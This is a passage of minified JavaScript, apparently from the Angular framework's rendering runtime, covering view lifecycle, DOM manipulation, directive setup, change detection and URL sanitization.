  let e = _p();
  return e ? e.sanitize(ms.URL, t) || "" : _l(t, "URL") ? tr(t) : mp(qc(t));
}
function UC(t) {
  let e = _p();
  if (e) return xf(e.sanitize(ms.RESOURCE_URL, t) || "");
  if (_l(t, "ResourceURL")) return xf(tr(t));
  throw new D(904, !1);
}
function $C(t, e) {
  return ("src" === e &&
    ("embed" === t ||
      "frame" === t ||
      "iframe" === t ||
      "media" === t ||
      "script" === t)) ||
    ("href" === e && ("base" === t || "link" === t))
    ? UC
    : nr;
}
function vp(t, e, i) {
  return $C(e, i)(t);
}
function _p() {
  let t = X();
  return t && t[Ke].sanitizer;
}
var HC = /^>|^->|<!--|-->|--!>|<!-$/g,
  zC = /(<|>)/g,
  WC = "​$1​";
function GC(t) {
  return t.replace(HC, (e) => e.replace(zC, WC));
}
function qC(t) {
  return t.ownerDocument.body;
}
function yp(t) {
  return t instanceof Function ? t() : t;
}
function Si(t) {
  return "browser" === (t ?? v(re)).get(Me);
}
var YC,
  Mt = (function (t) {
    return (
      (t[(t.Important = 1)] = "Important"),
      (t[(t.DashCase = 2)] = "DashCase"),
      t
    );
  })(Mt || {});
function yl(t, e) {
  return YC(t, e);
}
function Hn(t, e, i, n, r) {
  if (null != n) {
    let o,
      s = !1;
    ft(n) ? (o = n) : Ct(n) && ((s = !0), (n = n[Pe]));
    let a = Xe(n);
    0 === t && null !== i
      ? null == r
        ? Mp(e, i, a)
        : Zo(e, i, a, r || null, !0)
      : 1 === t && null !== i
      ? Zo(e, i, a, r || null, !0)
      : 2 === t
      ? Dl(e, a, s)
      : 3 === t && e.destroyNode(a),
      null != o && u0(e, t, o, i, r);
  }
}
function Cl(t, e) {
  return t.createText(e);
}
function wl(t, e) {
  return t.createComment(GC(e));
}
function vs(t, e, i) {
  return t.createElement(e, i);
}
function ZC(t, e) {
  Cp(t, e), (e[Pe] = null), (e[Je] = null);
}
function QC(t, e, i, n, r, o) {
  (n[Pe] = r), (n[Je] = e), _s(t, n, i, 1, r, o);
}
function Cp(t, e) {
  e[Ke].changeDetectionScheduler?.notify(1), _s(t, e, e[ne], 2, null, null);
}
function KC(t) {
  let e = t[Li];
  if (!e) return Ya(t[k], t);
  for (; e; ) {
    let i = null;
    if (Ct(e)) i = e[Li];
    else {
      let n = e[Ee];
      n && (i = n);
    }
    if (!i) {
      for (; e && !e[Ye] && e !== t; ) Ct(e) && Ya(e[k], e), (e = e[fe]);
      null === e && (e = t), Ct(e) && Ya(e[k], e), (i = e && e[Ye]);
    }
    e = i;
  }
}
function XC(t, e, i, n) {
  let r = Ee + n,
    o = i.length;
  n > 0 && (i[r - 1][Ye] = e),
    n < o - Ee
      ? ((e[Ye] = i[r]), rh(i, Ee + n, e))
      : (i.push(e), (e[Ye] = null)),
    (e[fe] = i);
  let s = e[Yi];
  null !== s && i !== s && JC(s, e);
  let a = e[wt];
  null !== a && a.insertView(t), lc(e), (e[I] |= 128);
}
function JC(t, e) {
  let i = t[Qn],
    r = e[fe][fe][Fe];
  e[Fe] !== r && (t[I] |= el.HasTransplantedViews),
    null === i ? (t[Qn] = [e]) : i.push(e);
}
function wp(t, e) {
  let i = t[Qn],
    n = i.indexOf(e);
  i.splice(n, 1);
}
function _c(t, e) {
  if (t.length <= Ee) return;
  let i = Ee + e,
    n = t[i];
  if (n) {
    let r = n[Yi];
    null !== r && r !== t && wp(r, n), e > 0 && (t[i - 1][Ye] = n[Ye]);
    let o = Vo(t, Ee + e);
    ZC(n[k], n);
    let s = o[wt];
    null !== s && s.detachView(o[k]),
      (n[fe] = null),
      (n[Ye] = null),
      (n[I] &= -129);
  }
  return n;
}
function bp(t, e) {
  if (!(256 & e[I])) {
    let i = e[ne];
    i.destroyNode && _s(t, e, i, 3, null, null), KC(e);
  }
}
function Ya(t, e) {
  if (256 & e[I]) return;
  let i = z(null);
  try {
    (e[I] &= -129),
      (e[I] |= 256),
      e[ln] && Od(e[ln]),
      t0(t, e),
      e0(t, e),
      1 === e[k].type && e[ne].destroy();
    let n = e[Yi];
    if (null !== n && ft(e[fe])) {
      n !== e[fe] && wp(n, e);
      let r = e[wt];
      null !== r && r.detachView(t);
    }
    CC(e);
  } finally {
    z(i);
  }
}
function e0(t, e) {
  let i = t.cleanup,
    n = e[Fi];
  if (null !== i)
    for (let o = 0; o < i.length - 1; o += 2)
      if ("string" == typeof i[o]) {
        let s = i[o + 3];
        s >= 0 ? n[s]() : n[-s].unsubscribe(), (o += 2);
      } else {
        let s = n[i[o + 1]];
        i[o].call(s);
      }
  null !== n && (e[Fi] = null);
  let r = e[Vt];
  if (null !== r) {
    e[Vt] = null;
    for (let o = 0; o < r.length; o++) {
      (0, r[o])();
    }
  }
}
function t0(t, e) {
  let i;
  if (null != t && null != (i = t.destroyHooks))
    for (let n = 0; n < i.length; n += 2) {
      let r = e[i[n]];
      if (!(r instanceof Ui)) {
        let o = i[n + 1];
        if (Array.isArray(o))
          for (let s = 0; s < o.length; s += 2) {
            let a = r[o[s]],
              c = o[s + 1];
            at(4, a, c);
            try {
              c.call(a);
            } finally {
              at(5, a, c);
            }
          }
        else {
          at(4, r, o);
          try {
            o.call(r);
          } finally {
            at(5, r, o);
          }
        }
      }
    }
}
function n0(t, e, i) {
  return i0(t, e.parent, i);
}
function i0(t, e, i) {
  let n = e;
  for (; null !== n && 40 & n.type; ) n = (e = n).parent;
  if (null === n) return i[Pe];
  {
    let { componentOffset: r } = n;
    if (r > -1) {
      let { encapsulation: o } = t.data[n.directiveStart + r];
      if (o === lt.None || o === lt.Emulated) return null;
    }
    return Te(n, i);
  }
}
function Zo(t, e, i, n, r) {
  t.insertBefore(e, i, n, r);
}
function Mp(t, e, i) {
  t.appendChild(e, i);
}
function Ef(t, e, i, n, r) {
  null !== n ? Zo(t, e, i, n, r) : Mp(t, e, i);
}
function r0(t, e, i, n) {
  t.removeChild(e, i, n);
}
function bl(t, e) {
  return t.parentNode(e);
}
function o0(t, e) {
  return t.nextSibling(e);
}
function s0(t, e, i) {
  return c0(t, e, i);
}
function a0(t, e, i) {
  return 40 & t.type ? Te(t, i) : null;
}
var Of,
  c0 = a0;
function Ml(t, e, i, n) {
  let r = n0(t, n, e),
    o = e[ne],
    a = s0(n.parent || e[Je], n, e);
  if (null != r)
    if (Array.isArray(i))
      for (let c = 0; c < i.length; c++) Ef(o, r, i[c], a, !1);
    else Ef(o, r, i, a, !1);
  void 0 !== Of && Of(o, n, e, i, r);
}
function ko(t, e) {
  if (null !== e) {
    let i = e.type;
    if (3 & i) return Te(e, t);
    if (4 & i) return yc(-1, t[e.index]);
    if (8 & i) {
      let n = e.child;
      if (null !== n) return ko(t, n);
      {
        let r = t[e.index];
        return ft(r) ? yc(-1, r) : Xe(r);
      }
    }
    if (32 & i) return yl(e, t)() || Xe(t[e.index]);
    {
      let n = Dp(t, e);
      if (null !== n) {
        if (Array.isArray(n)) return n[0];
        return ko(Bi(t[Fe]), n);
      }
      return ko(t, e.next);
    }
  }
  return null;
}
function Dp(t, e) {
  if (null !== e) {
    let n = t[Fe][Je],
      r = e.projection;
    return n.projection[r];
  }
  return null;
}
function yc(t, e) {
  let i = Ee + t + 1;
  if (i < e.length) {
    let n = e[i],
      r = n[k].firstChild;
    if (null !== r) return ko(n, r);
  }
  return e[bt];
}
function Dl(t, e, i) {
  let n = bl(t, e);
  n && r0(t, n, e, i);
}
function xp(t) {
  t.textContent = "";
}
function xl(t, e, i, n, r, o, s) {
  for (; null != i; ) {
    let a = n[i.index],
      c = i.type;
    if ((s && 0 === e && (a && fn(Xe(a), n), (i.flags |= 2)), 32 & ~i.flags))
      if (8 & c) xl(t, e, i.child, n, r, o, !1), Hn(e, t, r, a, o);
      else if (32 & c) {
        let u,
          l = yl(i, n);
        for (; (u = l()); ) Hn(e, t, r, u, o);
        Hn(e, t, r, a, o);
      } else 16 & c ? l0(t, e, n, i, r, o) : Hn(e, t, r, a, o);
    i = s ? i.projectionNext : i.next;
  }
}
function _s(t, e, i, n, r, o) {
  xl(i, n, t.firstChild, e, r, o, !1);
}
function l0(t, e, i, n, r, o) {
  let s = i[Fe],
    c = s[Je].projection[n.projection];
  if (Array.isArray(c))
    for (let l = 0; l < c.length; l++) {
      Hn(e, t, r, c[l], o);
    }
  else {
    let l = c,
      u = s[fe];
    Go(n) && (l.flags |= 128), xl(t, e, l, u, r, o, !0);
  }
}
function u0(t, e, i, n, r) {
  let o = i[bt];
  o !== Xe(i) && Hn(e, t, n, o, r);
  for (let a = Ee; a < i.length; a++) {
    let c = i[a];
    _s(c[k], c, t, e, n, o);
  }
}
function d0(t, e, i, n, r) {
  if (e) r ? t.addClass(i, n) : t.removeClass(i, n);
  else {
    let o = -1 === n.indexOf("-") ? void 0 : Mt.DashCase;
    null == r
      ? t.removeStyle(i, n, o)
      : ("string" == typeof r &&
          r.endsWith("!important") &&
          ((r = r.slice(0, -10)), (o |= Mt.Important)),
        t.setStyle(i, n, r, o));
  }
}
function f0(t, e, i) {
  t.setAttribute(e, "style", i);
}
function Ep(t, e, i) {
  "" === i ? t.removeAttribute(e, "class") : t.setAttribute(e, "class", i);
}
function Op(t, e, i) {
  let { mergedAttrs: n, classes: r, styles: o } = i;
  null !== n && ic(t, e, n),
    null !== r && Ep(t, e, r),
    null !== o && f0(t, e, o);
}
var ys = {};
function Be(t = 1) {
  Ip(je(), X(), Xi() + t, !1);
}
function Ip(t, e, i, n) {
  if (!n)
    if (3 & ~e[I]) {
      let o = t.preOrderHooks;
      null !== o && Ro(e, o, 0, i);
    } else {
      let o = t.preOrderCheckHooks;
      null !== o && Ao(e, o, i);
    }
  dn(i);
}
function P(t, e = j.Default) {
  let i = X();
  return null === i ? h(t, e) : Qh(Ve(), i, ke(t), e);
}
function Pp() {
  throw new Error("invalid");
}
function Sp(t, e, i, n, r, o) {
  let s = z(null);
  try {
    let a = null;
    r & de.SignalBased && (a = e[n][Md]),
      null !== a && void 0 !== a.transformFn && (o = a.transformFn(o)),
      r & de.HasDecoratorInputTransform &&
        (o = t.inputTransforms[n].call(e, o)),
      null !== t.setInput ? t.setInput(e, a, o, i, n) : Dh(e, a, n, o);
  } finally {
    z(s);
  }
}
function h0(t, e) {
  let i = t.hostBindingOpCodes;
  if (null !== i)
    try {
      for (let n = 0; n < i.length; n++) {
        let r = i[n];
        if (r < 0) dn(~r);
        else {
          let o = r,
            s = i[++n],
            a = i[++n];
          Hy(s, o), a(2, e[o]);
        }
      }
    } finally {
      dn(-1);
    }
}
function Cs(t, e, i, n, r, o, s, a, c, l, u) {
  let d = e.blueprint.slice();
  return (
    (d[Pe] = r),
    (d[I] = 204 | n),
    (null !== l || (t && 2048 & t[I])) && (d[I] |= 2048),
    Ph(d),
    (d[fe] = d[ei] = t),
    (d[Qe] = i),
    (d[Ke] = s || (t && t[Ke])),
    (d[ne] = a || (t && t[ne])),
    (d[Zn] = c || (t && t[Zn]) || null),
    (d[Je] = o),
    (d[fs] = _C()),
    (d[Ze] = u),
    (d[Ch] = l),
    (d[Fe] = 2 == e.type ? t[Fe] : d),
    d
  );
}
function ws(t, e, i, n, r) {
  let o = t.data[e];
  if (null === o) (o = p0(t, e, i, n, r)), $y() && (o.flags |= 32);
  else if (64 & o.type) {
    (o.type = i), (o.value = n), (o.attrs = r);
    let s = jy();
    o.injectorIndex = null === s ? -1 : s.injectorIndex;
  }
  return Ki(o, !0), o;
}
function p0(t, e, i, n, r) {
  let o = Ah(),
    s = Rh(),
    a = s ? o : o && o.parent,
    c = (t.data[e] = w0(t, a, i, e, n, r));
  return (
    null === t.firstChild && (t.firstChild = c),
    null !== o &&
      (s
        ? null == o.child && null !== c.parent && (o.child = c)
        : null === o.next && ((o.next = c), (c.prev = o))),
    c
  );
}
function Tp(t, e, i, n) {
  if (0 === i) return -1;
  let r = e.length;
  for (let o = 0; o < i; o++) e.push(n), t.blueprint.push(n), t.data.push(null);
  return r;
}
function Ap(t, e, i, n, r) {
  let o = Xi(),
    s = 2 & n;
  try {
    dn(-1), s && e.length > Se && Ip(t, e, Se, !1), at(s ? 2 : 0, r), i(n, r);
  } finally {
    dn(o), at(s ? 3 : 1, r);
  }
}
function Rp(t, e, i) {
  if (bh(e)) {
    let n = z(null);
    try {
      let r = e.directiveStart,
        o = e.directiveEnd;
      for (let s = r; s < o; s++) {
        let a = t.data[s];
        if (a.contentQueries) {
          let c = i[s];
          a.contentQueries(1, c, s);
        }
      }
    } finally {
      z(n);
    }
  }
}
function Np(t, e, i) {
  Th() && (O0(t, e, i, Te(i, e)), !(64 & ~i.flags) && Up(t, e, i));
}
function kp(t, e, i = Te) {
  let n = e.localNames;
  if (null !== n) {
    let r = e.index + 1;
    for (let o = 0; o < n.length; o += 2) {
      let s = n[o + 1],
        a = -1 === s ? i(e, t) : t[s];
      t[r++] = a;
    }
  }
}
function Fp(t) {
  let e = t.tView;
  return null === e || e.incompleteFirstPass
    ? (t.tView = El(
        1,
        null,
        t.template,
        t.decls,
        t.vars,
        t.directiveDefs,
        t.pipeDefs,
        t.viewQuery,
        t.schemas,
        t.consts,
        t.id
      ))
    : e;
}
function El(t, e, i, n, r, o, s, a, c, l, u) {
  let d = Se + n,
    f = d + r,
    m = g0(d, f),
    w = "function" == typeof l ? l() : l;
  return (m[k] = {
    type: t,
    blueprint: m,
    template: i,
    queries: null,
    viewQuery: a,
    declTNode: e,
    data: m.slice().fill(null, d),
    bindingStartIndex: d,
    expandoStartIndex: f,
    hostBindingOpCodes: null,
    firstCreatePass: !0,
    firstUpdatePass: !0,
    staticViewQueries: !1,
    staticContentQueries: !1,
    preOrderHooks: null,
    preOrderCheckHooks: null,
    contentHooks: null,
    contentCheckHooks: null,
    viewHooks: null,
    viewCheckHooks: null,
    destroyHooks: null,
    cleanup: null,
    contentQueries: null,
    components: null,
    directiveRegistry: "function" == typeof o ? o() : o,
    pipeRegistry: "function" == typeof s ? s() : s,
    firstChild: null,
    schemas: c,
    consts: w,
    incompleteFirstPass: !1,
    ssrId: u,
  });
}
function g0(t, e) {
  let i = [];
  for (let n = 0; n < e; n++) i.push(n < t ? null : ys);
  return i;
}
function m0(t, e, i, n) {
  let o = n.get(gp, pp) || i === lt.ShadowDom,
    s = t.selectRootElement(e, o);
  return v0(s), s;
}
function v0(t) {
  Lp(t);
}
var Lp = () => null;
function _0(t) {
  np(t) ? xp(t) : kC(t);
}
function y0() {
  Lp = _0;
}
function C0(t, e, i, n) {
  let r = zp(e);
  r.push(i), t.firstCreatePass && Wp(t).push(n, r.length - 1);
}
function w0(t, e, i, n, r, o) {
  let s = e ? e.injectorIndex : -1,
    a = 0;
  return (
    Qi() && (a |= 128),
    {
      type: i,
      index: n,
      insertBeforeIndex: null,
      injectorIndex: s,
      directiveStart: -1,
      directiveEnd: -1,
      directiveStylingLast: -1,
      componentOffset: -1,
      propertyBindings: null,
      flags: a,
      providerIndexes: 0,
      value: r,
      attrs: o,
      mergedAttrs: null,
      localNames: null,
      initialInputs: void 0,
      inputs: null,
      outputs: null,
      tView: null,
      next: null,
      prev: null,
      projectionNext: null,
      child: null,
      parent: e,
      projection: null,
      styles: null,
      stylesWithoutHost: null,
      residualStyles: void 0,
      classes: null,
      classesWithoutHost: null,
      residualClasses: void 0,
      classBindings: 0,
      styleBindings: 0,
    }
  );
}
function If(t, e, i, n, r) {
  for (let o in e) {
    if (!e.hasOwnProperty(o)) continue;
    let s = e[o];
    if (void 0 === s) continue;
    n ??= {};
    let a,
      c = de.None;
    Array.isArray(s) ? ((a = s[0]), (c = s[1])) : (a = s);
    let l = o;
    if (null !== r) {
      if (!r.hasOwnProperty(o)) continue;
      l = r[o];
    }
    0 === t ? Pf(n, i, l, a, c) : Pf(n, i, l, a);
  }
  return n;
}
function Pf(t, e, i, n, r) {
  let o;
  t.hasOwnProperty(i) ? (o = t[i]).push(e, n) : (o = t[i] = [e, n]),
    void 0 !== r && o.push(r);
}
function b0(t, e, i) {
  let n = e.directiveStart,
    r = e.directiveEnd,
    o = t.data,
    s = e.attrs,
    a = [],
    c = null,
    l = null;
  for (let u = n; u < r; u++) {
    let d = o[u],
      f = i ? i.get(d) : null,
      m = f ? f.inputs : null,
      w = f ? f.outputs : null;
    (c = If(0, d.inputs, u, c, m)), (l = If(1, d.outputs, u, l, w));
    let M = null === c || null === s || Kc(e) ? null : j0(c, u, s);
    a.push(M);
  }
  null !== c &&
    (c.hasOwnProperty("class") && (e.flags |= 8),
    c.hasOwnProperty("style") && (e.flags |= 16)),
    (e.initialInputs = a),
    (e.inputs = c),
    (e.outputs = l);
}
function M0(t) {
  return "class" === t
    ? "className"
    : "for" === t
    ? "htmlFor"
    : "formaction" === t
    ? "formAction"
    : "innerHtml" === t
    ? "innerHTML"
    : "readonly" === t
    ? "readOnly"
    : "tabindex" === t
    ? "tabIndex"
    : t;
}
function jp(t, e, i, n, r, o, s, a) {
  let u,
    c = Te(e, i),
    l = e.inputs;
  !a && null != l && (u = l[n])
    ? (Ol(t, i, u, n, r), Zi(e) && D0(i, e.index))
    : 3 & e.type
    ? ((n = M0(n)),
      (r = null != s ? s(r, e.value || "", n) : r),
      o.setProperty(c, n, r))
    : e.type;
}
function D0(t, e) {
  let i = $t(e, t);
  16 & i[I] || (i[I] |= 64);
}
function Vp(t, e, i, n) {
  if (Th()) {
    let s,
      a,
      r = null === n ? null : { "": -1 },
      o = P0(t, i);
    null === o ? (s = a = null) : ([s, a] = o),
      null !== s && Bp(t, e, i, s, r, a),
      r && S0(i, n, r);
  }
  i.mergedAttrs = Ni(i.mergedAttrs, i.attrs);
}
function Bp(t, e, i, n, r, o) {
  for (let l = 0; l < n.length; l++) iC(Gh(i, e), t, n[l].type);
  A0(i, t.data.length, n.length);
  for (let l = 0; l < n.length; l++) {
    let u = n[l];
    u.providersResolver && u.providersResolver(u);
  }
  let s = !1,
    a = !1,
    c = Tp(t, e, n.length, null);
  for (let l = 0; l < n.length; l++) {
    let u = n[l];
    (i.mergedAttrs = Ni(i.mergedAttrs, u.hostAttrs)),
      R0(t, i, e, c, u),
      T0(c, u, r),
      null !== u.contentQueries && (i.flags |= 4),
      (null !== u.hostBindings || null !== u.hostAttrs || 0 !== u.hostVars) &&
        (i.flags |= 64);
    let d = u.type.prototype;
    !s &&
      (d.ngOnChanges || d.ngOnInit || d.ngDoCheck) &&
      ((t.preOrderHooks ??= []).push(i.index), (s = !0)),
      !a &&
        (d.ngOnChanges || d.ngDoCheck) &&
        ((t.preOrderCheckHooks ??= []).push(i.index), (a = !0)),
      c++;
  }
  b0(t, i, o);
}
function x0(t, e, i, n, r) {
  let o = r.hostBindings;
  if (o) {
    let s = t.hostBindingOpCodes;
    null === s && (s = t.hostBindingOpCodes = []);
    let a = ~e.index;
    E0(s) != a && s.push(a), s.push(i, n, o);
  }
}
function E0(t) {
  let e = t.length;
  for (; e > 0; ) {
    let i = t[--e];
    if ("number" == typeof i && i < 0) return i;
  }
  return 0;
}
function O0(t, e, i, n) {
  let r = i.directiveStart,
    o = i.directiveEnd;
  Zi(i) && N0(e, i, t.data[r + i.componentOffset]),
    t.firstCreatePass || Gh(i, e),
    fn(n, e);
  let s = i.initialInputs;
  for (let a = r; a < o; a++) {
    let c = t.data[a],
      l = Kn(e, t, a, i);
    if ((fn(l, e), null !== s && L0(e, a - r, l, c, i, s), un(c))) {
      $t(i.index, e)[Qe] = Kn(e, t, a, i);
    }
  }
}
function Up(t, e, i) {
  let n = i.directiveStart,
    r = i.directiveEnd,
    o = i.index,
    s = zy();
  try {
    dn(o);
    for (let a = n; a < r; a++) {
      let c = t.data[a],
        l = e[a];
      uc(a),
        (null !== c.hostBindings || 0 !== c.hostVars || null !== c.hostAttrs) &&
          I0(c, l);
    }
  } finally {
    dn(-1), uc(s);
  }
}
function I0(t, e) {
  null !== t.hostBindings && t.hostBindings(1, e);
}
function P0(t, e) {
  let i = t.directiveRegistry,
    n = null,
    r = null;
  if (i)
    for (let o = 0; o < i.length; o++) {
      let s = i[o];
      if (Q_(e, s.selectors, !1))
        if ((n || (n = []), un(s)))
          if (null !== s.findHostDirectiveDefs) {
            let a = [];
            (r = r || new Map()),
              s.findHostDirectiveDefs(s, a, r),
              n.unshift(...a, s),
              Cc(t, e, a.length);
          } else n.unshift(s), Cc(t, e, 0);
        else
          (r = r || new Map()), s.findHostDirectiveDefs?.(s, n, r), n.push(s);
    }
  return null === n ? null : [n, r];
}
function Cc(t, e, i) {
  (e.componentOffset = i), (t.components ??= []).push(e.index);
}
function S0(t, e, i) {
  if (e) {
    let n = (t.localNames = []);
    for (let r = 0; r < e.length; r += 2) {
      let o = i[e[r + 1]];
      if (null == o) throw new D(-301, !1);
      n.push(e[r], o);
    }
  }
}
function T0(t, e, i) {
  if (i) {
    if (e.exportAs)
      for (let n = 0; n < e.exportAs.length; n++) i[e.exportAs[n]] = t;
    un(e) && (i[""] = t);
  }
}
function A0(t, e, i) {
  (t.flags |= 1),
    (t.directiveStart = e),
    (t.directiveEnd = e + i),
    (t.providerIndexes = e);
}
function R0(t, e, i, n, r) {
  t.data[n] = r;
  let o = r.factory || (r.factory = qn(r.type, !0)),
    s = new Ui(o, un(r), P);
  (t.blueprint[n] = s), (i[n] = s), x0(t, e, n, Tp(t, i, r.hostVars, ys), r);
}
function N0(t, e, i) {
  let n = Te(e, t),
    r = Fp(i),
    o = t[Ke].rendererFactory,
    s = 16;
  i.signals ? (s = 4096) : i.onPush && (s = 64);
  let a = bs(
    t,
    Cs(t, r, null, s, n, e, null, o.createRenderer(n, i), null, null, null)
  );
  t[e.index] = a;
}
function k0(t, e, i, n, r, o) {
  let s = Te(t, e);
  F0(e[ne], s, o, t.value, i, n, r);
}
function F0(t, e, i, n, r, o, s) {
  if (null == o) t.removeAttribute(e, r, i);
  else {
    let a = null == s ? qc(o) : s(o, n || "", r);
    t.setAttribute(e, r, a, i);
  }
}
function L0(t, e, i, n, r, o) {
  let s = o[e];
  if (null !== s)
    for (let a = 0; a < s.length; ) {
      Sp(n, i, s[a++], s[a++], s[a++], s[a++]);
    }
}
function j0(t, e, i) {
  let n = null,
    r = 0;
  for (; r < i.length; ) {
    let o = i[r];
    if (0 !== o)
      if (5 !== o) {
        if ("number" == typeof o) break;
        if (t.hasOwnProperty(o)) {
          null === n && (n = []);
          let s = t[o];
          for (let a = 0; a < s.length; a += 3)
            if (s[a] === e) {
              n.push(o, s[a + 1], s[a + 2], i[r + 1]);
              break;
            }
        }
        r += 2;
      } else r += 2;
    else r += 4;
  }
  return n;
}
function $p(t, e, i, n) {
  return [t, !0, 0, e, null, n, null, i, null, null];
}
function Hp(t, e) {
  let i = t.contentQueries;
  if (null !== i) {
    let n = z(null);
    try {
      for (let r = 0; r < i.length; r += 2) {
        let o = i[r],
          s = i[r + 1];
        if (-1 !== s) {
          let a = t.data[s];
          ol(o), a.contentQueries(2, e[s], s);
        }
      }
    } finally {
      z(n);
    }
  }
}
function bs(t, e) {
  return t[Li] ? (t[vf][Ye] = e) : (t[Li] = e), (t[vf] = e), e;
}
function wc(t, e, i) {
  ol(0);
  let n = z(null);
  try {
    e(t, i);
  } finally {
    z(n);
  }
}
function zp(t) {
  return t[Fi] || (t[Fi] = []);
}
function Wp(t) {
  return t.cleanup || (t.cleanup = []);
}
function Gp(t, e) {
  let i = t[Zn],
    n = i ? i.get(ut, null) : null;
  n && n.handleError(e);
}
function Ol(t, e, i, n, r) {
  for (let o = 0; o < i.length; ) {
    let s = i[o++],
      a = i[o++],
      c = i[o++],
      l = e[s];
    Sp(t.data[s], l, n, a, c, r);
  }
}
function V0(t, e) {
  let i = $t(e, t),
    n = i[k];
  B0(n, i);
  let r = i[Pe];
  null !== r && null === i[Ze] && (i[Ze] = ml(r, i[Zn])), Il(n, i, i[Qe]);
}
function B0(t, e) {
  for (let i = e.length; i < t.blueprint.length; i++) e.push(t.blueprint[i]);
}
function Il(t, e, i) {
  sl(e);
  try {
    let n = t.viewQuery;
    null !== n && wc(1, n, i);
    let r = t.template;
    null !== r && Ap(t, e, r, 1, i),
      t.firstCreatePass && (t.firstCreatePass = !1),
      e[wt]?.finishViewCreation(t),
      t.staticContentQueries && Hp(t, e),
      t.staticViewQueries && wc(2, t.viewQuery, i);
    let o = t.components;
    null !== o && U0(e, o);
  } catch (n) {
    throw (
      (t.firstCreatePass &&
        ((t.incompleteFirstPass = !0), (t.firstCreatePass = !1)),
      n)
    );
  } finally {
    (e[I] &= -5), al();
  }
}
function U0(t, e) {
  for (let i = 0; i < e.length; i++) V0(t, e[i]);
}
function $0(t, e, i, n) {
  let r = z(null);
  try {
    let o = e.tView,
      c = Cs(
        t,
        o,
        i,
        4096 & t[I] ? 4096 : 16,
        null,
        e,
        null,
        null,
        n?.injector ?? null,
        n?.embeddedViewInjector ?? null,
        n?.dehydratedView ?? null
      ),
      l = t[e.index];
    c[Yi] = l;
    let u = t[wt];
    return null !== u && (c[wt] = u.createEmbeddedView(o)), Il(o, c, i), c;
  } finally {
    z(r);
  }
}
function Sf(t, e) {
  return !e || null === e.firstChild || Go(t);
}
function H0(t, e, i, n = !0) {
  let r = e[k];
  if ((XC(r, e, t, i), n)) {
    let s = yc(i, t),
      a = e[ne],
      c = bl(a, t[bt]);
    null !== c && QC(r, t[Je], a, e, c, s);
  }
  let o = e[Ze];
  null !== o && null !== o.firstChild && (o.firstChild = null);
}
function Qo(t, e, i, n, r = !1) {
  for (; null !== i; ) {
    let o = e[i.index];
    null !== o && n.push(Xe(o)), ft(o) && z0(o, n);
    let s = i.type;
    if (8 & s) Qo(t, e, i.child, n);
    else if (32 & s) {
      let c,
        a = yl(i, e);
      for (; (c = a()); ) n.push(c);
    } else if (16 & s) {
      let a = Dp(e, i);
      if (Array.isArray(a)) n.push(...a);
      else {
        let c = Bi(e[Fe]);
        Qo(c[k], c, a, n, !0);
      }
    }
    i = r ? i.projectionNext : i.next;
  }
  return n;
}
function z0(t, e) {
  for (let i = Ee; i < t.length; i++) {
    let n = t[i],
      r = n[k].firstChild;
    null !== r && Qo(n[k], n, r, e);
  }
  t[bt] !== t[Pe] && e.push(t[bt]);
}
var qp = [];
function W0(t) {
  return t[ln] ?? G0(t);
}
function G0(t) {
  let e = qp.pop() ?? Object.create(Y0);
  return (e.lView = t), e;
}
function q0(t) {
  t.lView[ln] !== t && ((t.lView = null), qp.push(t));
}
var Y0 = Z(C({}, Dd), {
    consumerIsAlwaysLive: !0,
    consumerMarkedDirty: (t) => {
      Vi(t.lView);
    },
    consumerOnSignalRead() {
      this.lView[ln] = this;
    },
  }),
  Yp = 100;
function Zp(t, e = !0, i = 0) {
  let n = t[Ke],
    r = n.rendererFactory;
  r.begin?.();
  try {
    Z0(t, i);
  } catch (s) {
    throw (e && Gp(t, s), s);
  } finally {
    r.end?.(), n.inlineEffectRunner?.flush();
  }
}
function Z0(t, e) {
  bc(t, e);
  let i = 0;
  for (; il(t); ) {
    if (i === Yp) throw new D(103, !1);
    i++, bc(t, 1);
  }
}
function Q0(t, e, i, n) {
  let r = e[I];
  if (!(256 & ~r)) return;
  e[Ke].inlineEffectRunner?.flush(), sl(e);
  let s = null,
    a = null;
  K0(t) && ((a = W0(e)), (s = xd(a)));
  try {
    Ph(e), By(t.bindingStartIndex), null !== i && Ap(t, e, i, 2, n);
    let c = !(3 & ~r);
    if (c) {
      let d = t.preOrderCheckHooks;
      null !== d && Ao(e, d, null);
    } else {
      let d = t.preOrderHooks;
      null !== d && Ro(e, d, 0, null), Ha(e, 0);
    }
    if ((X0(e), Qp(e, 0), null !== t.contentQueries && Hp(t, e), c)) {
      let d = t.contentCheckHooks;
      null !== d && Ao(e, d);
    } else {
      let d = t.contentHooks;
      null !== d && Ro(e, d, 1), Ha(e, 1);
    }
    h0(t, e);
    let l = t.components;
    null !== l && Xp(e, l, 0);
    let u = t.viewQuery;
    if ((null !== u && wc(2, u, n), c)) {
      let d = t.viewCheckHooks;
      null !== d && Ao(e, d);
    } else {
      let d = t.viewHooks;
      null !== d && Ro(e, d, 2), Ha(e, 2);
    }
    if ((!0 === t.firstUpdatePass && (t.firstUpdatePass = !1), e[$a])) {
      for (let d of e[$a]) d();
      e[$a] = null;
    }
    e[I] &= -73;
  } catch (c) {
    throw (Vi(e), c);
  } finally {
    null !== a && (Ed(a, s), q0(a)), al();
  }
}
function K0(t) {
  return 2 !== t.type;
}
function Qp(t, e) {
  for (let i = rp(t); null !== i; i = op(i))
    for (let n = Ee; n < i.length; n++) {
      Kp(i[n], e);
    }
}
function X0(t) {
  for (let e = rp(t); null !== e; e = op(e)) {
    if (!(e[I] & el.HasTransplantedViews)) continue;
    let i = e[Qn];
    for (let n = 0; n < i.length; n++) {
      let r = i[n];
      r[fe];
      Py(r);
    }
  }
}
function J0(t, e, i) {
  Kp($t(e, t), i);
}
function Kp(t, e) {
  nl(t) && bc(t, e);
}
function bc(t, e) {
  let n = t[k],
    r = t[I],
    o = t[ln],
    s = !!(0 === e && 16 & r);
  if (
    ((s ||= !!(64 & r && 0 === e)),
    (s ||= !!(1024 & r)),
    (s ||= !(!o?.dirty || !Ma(o))),
    o && (o.dirty = !1),
    (t[I] &= -9217),
    s)
  )
    Q0(n, t, n.template, t[Qe]);
  else if (8192 & r) {
    Qp(t, 1);
    let a = n.components;
    null !== a && Xp(t, a, 1);
  }
}
function Xp(t, e, i) {
  for (let n = 0; n < e.length; n++) J0(t, e[n], i);
}
function Pl(t) {
  for (t[Ke].changeDetectionScheduler?.notify(); t; ) {
    t[I] |= 64;
    let e = Bi(t);
    if (Mh(t) && !e) return t;
    t = e;
  }
  return null;
}
var hn = class {
    get rootNodes() {
      let e = this._lView,
        i = e[k];
      return Qo(i, e, i.firstChild, []);
    }
    constructor(e, i, n = !0) {
      (this._lView = e),
        (this._cdRefInjectingView = i),
